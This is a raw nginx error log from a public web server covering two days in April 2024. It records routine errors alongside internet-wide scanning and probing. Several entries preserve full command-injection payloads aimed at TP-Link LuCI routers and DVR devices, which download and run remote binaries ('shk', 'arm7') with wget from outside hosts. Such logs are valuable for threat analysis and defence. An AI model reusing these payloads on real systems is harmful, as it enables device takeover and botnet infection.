2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/17 14:54:38 [error] 22#22: *12 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.188.145, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 15:00:40 [error] 22#22: *13 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.88, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 15:00:40 [error] 22#22: *13 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.88, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 15:02:38 [error] 22#22: *14 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 15:16:10 [error] 22#22: *15 directory index of "/usr/share/nginx/html/" is forbidden, client: 146.19.24.28, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 15:23:07 [error] 22#22: *16 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.199.112.4, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 15:46:24 [error] 22#22: *17 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.152.52.99, server: localhost, request: "GET / HTTP/1.0"
2024/04/17 15:57:46 [error] 22#22: *18 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.87, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 15:57:46 [error] 22#22: *18 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.87, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 16:34:20 [error] 23#23: *20 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 16:40:10 [error] 23#23: *21 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 16:57:20 [error] 23#23: *23 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.188.155, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 16:57:20 [error] 23#23: *23 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.188.155, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/17 17:41:44 [error] 23#23: *24 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 19:24:39 [error] 23#23: *26 directory index of "/usr/share/nginx/html/" is forbidden, client: 216.218.206.69, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 19:26:41 [error] 23#23: *27 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 216.218.206.69, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/17 19:29:30 [error] 23#23: *29 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 216.218.206.69, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
2024/04/17 19:30:46 [error] 23#23: *31 directory index of "/usr/share/nginx/html/" is forbidden, client: 221.11.60.146, server: localhost, request: "HEAD http://110.242.68.4/ HTTP/1.1", host: "110.242.68.4"
2024/04/17 19:55:12 [error] 23#23: *33 directory index of "/usr/share/nginx/html/" is forbidden, client: 221.207.34.86, server: localhost, request: "GET http://dongtaiwang.com/ HTTP/1.1", host: "dongtaiwang.com"
2024/04/17 19:55:12 [error] 22#22: *35 directory index of "/usr/share/nginx/html/" is forbidden, client: 221.207.34.86, server: localhost, request: "GET http://www.wujieliulan.com/ HTTP/1.1", host: "www.wujieliulan.com"
2024/04/17 19:55:12 [error] 22#22: *36 "/usr/share/nginx/html/english/index.html" is not found (2: No such file or directory), client: 221.207.34.86, server: localhost, request: "GET http://www.rfa.org/english/ HTTP/1.1", host: "www.rfa.org"
2024/04/17 19:55:13 [error] 22#22: *37 directory index of "/usr/share/nginx/html/" is forbidden, client: 221.207.34.86, server: localhost, request: "GET http://www.minghui.org/ HTTP/1.1", host: "www.minghui.org"
2024/04/17 19:55:16 [error] 23#23: *32 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 19:55:18 [error] 22#22: *39 directory index of "/usr/share/nginx/html/" is forbidden, client: 118.212.122.136, server: localhost, request: "GET http://www.epochtimes.com/ HTTP/1.1", host: "www.epochtimes.com"
2024/04/17 19:55:19 [error] 22#22: *40 directory index of "/usr/share/nginx/html/" is forbidden, client: 118.212.122.136, server: localhost, request: "GET http://www.soso.com/ HTTP/1.1", host: "www.soso.com"
2024/04/17 20:29:25 [error] 22#22: *43 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.180.143.136, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 21:45:03 [error] 22#22: *44 directory index of "/usr/share/nginx/html/" is forbidden, client: 134.209.167.163, server: localhost, request: "GET / HTTP/1.0"
2024/04/17 22:01:32 [error] 22#22: *45 directory index of "/usr/share/nginx/html/" is forbidden, client: 134.209.167.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 22:01:32 [error] 22#22: *45 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 134.209.167.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188", referrer: "http://8.148.22.188/"
2024/04/17 22:13:12 [error] 22#22: *47 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 22:28:07 [error] 22#22: *48 directory index of "/usr/share/nginx/html/" is forbidden, client: 186.138.107.5, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 22:42:34 [error] 22#22: *50 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.58, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 22:42:38 [error] 23#23: *51 directory index of "/usr/share/nginx/html/" is forbidden, client: 167.94.146.58, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 22:47:02 [error] 23#23: *54 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/17 22:52:26 [error] 23#23: *55 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/17 23:16:01 [error] 23#23: *56 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 107.170.236.32, server: localhost, request: "GET /hudson HTTP/1.1", host: "8.148.22.188"
2024/04/17 23:39:46 [error] 23#23: *57 directory index of "/usr/share/nginx/html/" is forbidden, client: 138.122.229.85, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 01:14:09 [error] 23#23: *58 directory index of "/usr/share/nginx/html/" is forbidden, client: 87.236.176.40, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 01:52:01 [error] 23#23: *61 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 02:56:12 [error] 23#23: *63 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.30, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 02:58:43 [error] 23#23: *64 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.180.143.138, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 02:58:46 [error] 23#23: *65 open() "/usr/share/nginx/html/wp-content/plugins/kingcomposer/readme.txt" failed (2: No such file or directory), client: 185.180.143.138, server: localhost, request: "GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1", host: "8.148.22.188"
2024/04/18 03:43:06 [error] 22#22: *67 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 04:14:06 [error] 22#22: *68 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 04:36:05 [error] 22#22: *69 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 05:02:33 [error] 22#22: *71 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 192.241.234.19, server: localhost, request: "GET /portal/redlion HTTP/1.1", host: "8.148.22.188"
2024/04/18 06:35:55 [error] 22#22: *72 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.101, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 06:36:13 [error] 22#22: *73 open() "/usr/share/nginx/html/actuator/health" failed (2: No such file or directory), client: 192.241.210.20, server: localhost, request: "GET /actuator/health HTTP/1.1", host: "8.148.22.188"
2024/04/18 06:56:05 [error] 22#22: *74 directory index of "/usr/share/nginx/html/" is forbidden, client: 125.82.243.103, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 06:57:36 [error] 22#22: *75 directory index of "/usr/share/nginx/html/" is forbidden, client: 112.94.252.175, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 08:01:36 [error] 22#22: *77 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.73.245, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 08:03:59 [error] 22#22: *78 directory index of "/usr/share/nginx/html/" is forbidden, client: 83.97.73.245, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 08:12:17 [error] 22#22: *79 open() "/usr/share/nginx/html/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 83.97.73.245, server: localhost, request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 08:17:34 [error] 22#22: *80 directory index of "/usr/share/nginx/html/" is forbidden, client: 104.199.31.214, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 08:30:34 [error] 22#22: *82 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 08:37:49 [error] 23#23: *83 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 09:20:42 [error] 23#23: *84 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 10:20:12 [error] 23#23: *87 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.19, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 10:33:53 [error] 23#23: *89 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.28, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 11:08:20 [error] 23#23: *91 open() "/usr/share/nginx/html/ReportServer" failed (2: No such file or directory), client: 162.243.151.9, server: localhost, request: "GET /ReportServer HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:30:03 [error] 23#23: *92 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.216.150.234, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 11:42:33 [error] 23#23: *93 directory index of "/usr/share/nginx/html/" is forbidden, client: 64.62.197.104, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:44:45 [error] 23#23: *94 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.197.99, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:48:27 [error] 23#23: *95 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.197.105, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:48:54 [error] 23#23: *97 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:48:58 [error] 23#23: *97 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:49:02 [error] 23#23: *97 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:49:05 [error] 23#23: *98 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:49:08 [error] 23#23: *98 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:54:41 [error] 22#22: *99 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.128.232.129, server: localhost, request: "GET / HTTP/1.0"
2024/04/18 11:54:57 [error] 22#22: *101 "/usr/share/nginx/html/:8848/nacos/index.html" is not found (2: No such file or directory), client: 171.43.237.166, server: localhost, request: "GET /:8848/nacos/ HTTP/1.1", host: "8.148.22.188"
2024/04/18 11:54:57 [error] 22#22: *101 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 171.43.237.166, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188", referrer: "http://8.148.22.188/:8848/nacos/"
2024/04/18 12:09:46 [error] 22#22: *104 open() "/usr/share/nginx/html/manager/html" failed (2: No such file or directory), client: 192.241.213.12, server: localhost, request: "GET /manager/html HTTP/1.1", host: "8.148.22.188"
2024/04/18 14:03:28 [error] 22#22: *106 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 14:16:51 [error] 22#22: *107 open() "/usr/share/nginx/html/device.rsp" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F94.156.79.129%2Farm7%3Bchmod%20777%20arm7%3B%20.%2Farm7%200daydvr%3B HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 14:43:53 [error] 22#22: *108 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 15:22:39 [error] 22#22: *109 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.203.57.1, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 15:23:38 [error] 22#22: *110 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/18 15:51:46 [error] 22#22: *112 directory index of "/usr/share/nginx/html/" is forbidden, client: 192.155.88.231, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/18 15:58:16 [error] 22#22: *113 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
